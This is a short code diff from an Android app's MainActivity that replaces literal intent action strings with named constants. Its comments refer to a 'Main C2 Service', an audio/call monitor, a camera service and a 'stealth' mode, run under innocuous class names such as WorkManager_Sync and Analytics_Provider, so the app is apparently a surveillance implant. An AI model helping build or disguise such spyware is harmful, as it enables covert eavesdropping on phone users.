@@ -468,7 +468,7 @@ public class MainActivity extends AppCompatActivity {
         });
         
         Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
-        serviceIntent.setAction("START");
+        serviceIntent.setAction(Constants.ACTION_START_CORE);
 
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -484,7 +484,7 @@ public class MainActivity extends AppCompatActivity {
         try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
         
         Intent callServiceIntent = new Intent(this, MediaFrameworkService.class);
-        callServiceIntent.setAction("START_SERVICE");
+        callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(callServiceIntent);
@@ -504,7 +504,7 @@ public class MainActivity extends AppCompatActivity {
 
         // 1. Stop Main C2 Service
         Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
-        serviceIntent.setAction("STOP");
+        serviceIntent.setAction(Constants.ACTION_STOP_CORE);
         startService(serviceIntent);
 
         // 2. Stop Audio/Call Monitor
@@ -513,7 +513,7 @@ public class MainActivity extends AppCompatActivity {
 
         // 3. Stop Optics/Camera Service
         Intent cameraIntent = new Intent(this, Analytics_Provider.class);
-        cameraIntent.setAction("STOP");
+        cameraIntent.setAction(Constants.ACTION_STOP_OPTICS);
         startService(cameraIntent);
 
         // 4. Force Process Exit (Optional, if not in stealth)
